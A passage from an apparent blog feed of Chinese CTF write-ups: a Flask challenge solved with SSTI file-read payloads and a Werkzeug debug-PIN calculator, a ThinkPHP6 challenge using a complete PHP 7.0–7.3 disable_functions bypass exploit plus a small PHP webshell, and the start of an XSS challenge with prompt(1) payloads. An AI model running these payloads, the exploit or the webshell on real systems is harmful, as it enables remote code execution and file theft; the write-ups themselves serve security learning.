class="keyword">in</span> r.text:</span><br><span class="line">                flag=i</span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp1()</span><br><span class="line">    exp2()</span><br></pre></td></tr></table></figure><h1 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h1><h2 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h2><h3 id="Flaskapp"><a href="#Flaskapp" class="headerlink" title="Flaskapp"></a>Flaskapp</h3><p>进入网站y有两个功能：Base64编码，解码。在解码功能中，输入非法字符串，将会出现错误，可以进入debug模式。<br><img src="https://i.loli.net/2020/02/25/Co6Ls8Oqn3biYZR.png"></p><p>但是需要PIN码，这里涉及到一个知识<a href="https://xz.aliyun.com/t/2553">Flask debug pin安全问题</a></p><p>这个PIN码并不安全，如果可以得到一些信息，就可以计算出来。如果可以读取出这些信息，计算出PIN码，就可以进入debug模式，可以RCE解决问题。</p><p>测试发现解密处存在Flask的SSTI，可以利用SSTI进行任意文件读取（由于不知道flag位置和文件名，只能去读已知的文件）。<br>payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;想要读取的文件&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br></pre></td></tr></table></figure><p><strong>获取machine-id</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;proc&#x2F;self&#x2F;cgroup&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line"></span><br><span class="line">eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbignL3Byb2Mvc2VsZi9jZ3JvdXAnLCAncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9IA&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">9:devices:&#x2F;docker&#x2F;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320</span><br></pre></td></tr></table></figure><blockquote><p>docker环境，读取/etc/machine-id 是错误的</p></blockquote><p><strong>获取MAC地址</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</span><br><span class="line">02:42:ac:12:00:06</span><br><span class="line"># 注意mac地址要转成十进制: 2485377957894</span><br></pre></td></tr></table></figure><p><strong>获取用户名</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">flaskweb:x:1000:1000::&#x2F;home&#x2F;flaskweb:</span><br></pre></td></tr></table></figure><p><strong>报错得到flask app的路径</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py</span><br></pre></td></tr></table></figure><p>通过大佬的脚本计算PIN码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#脚本出处：https://xz.aliyun.com/t/2553</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377957894&#x27;</span>,<span class="comment"># mac address,需要转成十进制</span></span><br><span class="line">    <span class="string">&#x27;3c7c60af8484830ab0b1e9615fada4e74d93a8a111baa4afcd949feeab56c320&#x27;</span><span class="comment"># machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> len(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(rv)</span><br></pre></td></tr></table></figure><p>得到PIN码，刚才报错的位置，输入PIN码，正确即可进入一个python的shell</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python flask-PIN.py</span><br><span class="line">103-824-476</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/02/25/9u6iAn7eqayw21W.png"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; print(os.popen(&#39;ls &#x2F;&#39;).read())</span><br><span class="line">...</span><br><span class="line">this_is_the_flag.txt</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; flag &#x3D; os.popen(&#39;cat &#x2F;this_is_the_flag.txt&#39;).read()</span><br><span class="line">&gt;&gt;&gt; print(flag)</span><br><span class="line">flag&#123;93df69f0-3005-414f-a119-c5562af1b167&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-thinking"><a href="#easy-thinking" class="headerlink" title="easy_thinking"></a>easy_thinking</h3><p>非预期</p><p>因为<code>/runtime/session/</code>存在目录遍历，加之题目没有做docker容器，导致可以看其他选手的payload，在这个目录下发现了其他选手存的东西：</p><p><img src="https://i.loli.net/2020/02/25/kHFnqSGICh4LgDY.png"></p><p><strong>预期解</strong></p><p>考察<a href="https://paper.seebug.org/1114/">TP6任意文件操作漏洞</a></p><blockquote><p>由不安全的SessionId导致的任意文件操作漏洞。该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以getshell。</p></blockquote><p>进入网站，登录后，有一个搜索功能，会将个人搜索记录以序列化的方式存到以session命名的文件中。</p><p>因为存在上述漏洞，可以任意写入文件，这里直接写一句话，发现不行。用<code>phpinfo()</code>查看禁用函数。</p><p><img src="https://i.loli.net/2020/02/25/B15Kbfl6wMQR3rn.png"></p><p>用<code>scandir(&#39;/&#39;)</code>发现根目录，有一个<code>flag</code>和一个<code>readflag</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .dockerenv [3] &#x3D;&gt; bin [4] &#x3D;&gt; boot [5] &#x3D;&gt; dev [6] &#x3D;&gt; etc [7] &#x3D;&gt; flag [8] &#x3D;&gt; home [9] &#x3D;&gt; lib [10] &#x3D;&gt; lib64 [11] &#x3D;&gt; media [12] &#x3D;&gt; mnt [13] &#x3D;&gt; opt [14] &#x3D;&gt; proc [15] &#x3D;&gt; readflag [16] &#x3D;&gt; root [17] &#x3D;&gt; run [18] &#x3D;&gt; sbin [19] &#x3D;&gt; srv [20] &#x3D;&gt; start.sh [21] &#x3D;&gt; sys [22] &#x3D;&gt; tmp [23] &#x3D;&gt; usr [24] &#x3D;&gt; var ) &quot;;&#125;</span><br></pre></td></tr></table></figure><p>尝试用php的文件读取函数直接读<code>flag</code>，发现没有权限<code>Permission denied </code>。</p><p>推测需要通过绕过禁用函数，RCE执行<code>readflag</code>读取<code>flag</code>。</p><p>找了一个大佬的脚本：<a href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></p><p>利用这个<strong>GC的特定析构函数free后使用导致的漏洞</strong><a href="https://bugs.php.net/bug.php?id=72530"><strong>Use After Free in GC with Certain Destructors</strong></a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># <span class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=72530</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.3 versions</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;/readflag&quot;</span>); <span class="comment">//这里是想要执行的系统命令</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params">$cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params">$ptr, $m = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;$str, $p, $v, $n = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">$addr, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params">$base</span>) </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params">$base, $elf</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params">$binary_leak</span>) </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params">$basic_funcs</span>) </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $ryat;</span><br><span class="line">        <span class="keyword">var</span> $chtg;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    $poc = <span class="string">&#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;</span>;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    $abc = $out[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是因为题目的搜索有长度限制，并不能直接把这么长的脚本保存到session的php文件里，需要先传一个php小马，再用小马上传这个<code>bypass</code>脚本。这是我找的一个小马：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php if(@$_GET[&quot;act&quot;]&#x3D;&#x3D;&quot;save&quot;)&#123;if(isset($_POST[&quot;content&quot;])&amp;&amp;isset($_POST[&quot;name&quot;]))&#123;if($_POST[&quot;content&quot;]!&#x3D;&quot;&quot;&amp;&amp;$_POST[&quot;name&quot;]!&#x3D;&quot;&quot;)&#123;if(fwrite(fopen(stripslashes($_POST[&quot;name&quot;]),&quot;w&quot;),stripslashes($_POST[&quot;content&quot;])))&#123;echo &quot;OK! &lt;a href&#x3D;\&quot;&quot;.stripslashes($_POST[&quot;name&quot;]).&quot;\&quot;&gt;&quot;.stripslashes($_POST[&quot;name&quot;]).&quot;&lt;&#x2F;a&gt;&quot;;&#125;;&#125;&#125;&#125;else&#123;if(@$_GET[&quot;act&quot;]&#x3D;&#x3D;&quot;godsdoor&quot;)&#123;echo &#39;&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;&lt;form action&#x3D;&quot;?act&#x3D;save&quot; method&#x3D;&quot;post&quot;&gt;content:&lt;br&#x2F;&gt;&lt;textarea name&#x3D;&quot;content&quot; &gt;&lt;&#x2F;textarea&gt;&lt;br&#x2F;&gt;filenane:&lt;br&#x2F;&gt;&lt;input name&#x3D;&quot;name&quot;&#x2F;&gt;&lt;br&#x2F;&gt;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;GO!&quot;&gt;&lt;&#x2F;form&gt;&#39;;&#125;&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F; ?act&#x3D;godsdoor</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/02/25/v6P75cmJGpabOjl.png"></p><p>将上面的<code>bypass.php</code>上传到这个目录，访问上传的文件就可以RCE了。</p><p><img src="https://i.loli.net/2020/02/25/PqzkIJErRKdm3UT.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Day1&quot;&gt;&lt;a href=&quot;#Day1&quot; class=&quot;headerlink&quot; title=&quot;Day1&quot;&gt;&lt;/a&gt;Day1&lt;/h1&gt;&lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;we</summary>
      
    
    
    
    <category term="CTF" scheme="http://v0w.top/categories/CTF/"/>
    
    
    <category term="SQL注入" scheme="http://v0w.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="文件上传" scheme="http://v0w.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    <category term="反序列化" scheme="http://v0w.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>prompt(1) to win——XSSchallenge</title>
    <link href="http://v0w.top/2020/02/20/XSS-challenge/"/>
    <id>http://v0w.top/2020/02/20/XSS-challenge/</id>
    <published>2020-02-19T16:00:00.000Z</published>
    <updated>2020-12-23T04:18:49.130Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>靶场：<a href="http://prompt.ml/">http://prompt.ml/</a></p><p>整体看来还是比较简单的XSS利用和绕过。当然也学习到一些新的姿势，学习记录。</p><h2 id="第0关"><a href="#第0关" class="headerlink" title="第0关"></a>第0关</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;prompt(1)&lt;&#x2F;script&gt;&quot;&lt;</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-10-10-054427.jpg"></p><h2 id="第1关"><a href="#第1关" class="headerlink" title="第1关"></a>第1关</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;body onload&#x3D;prompt(1)&#x2F;&#x2F;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;prompt(1)&#x2F;&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>过滤了<code>&lt;***&gt;</code>的标签，我们可以通过<code>//</code>进行绕过。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// tags stripping mechanism from ExtJS library</span></span><br><span class="line">    <span class="comment">// Ext.util.Format.stripTags</span></span><br><span class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</span><br><span class="line">    input = input.replace(stripTagsRE, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;article&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/article&gt;&#x27;</span>;</span><br><span class="line">&#125;      </span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-10-10-055528.jpg"></p><h2 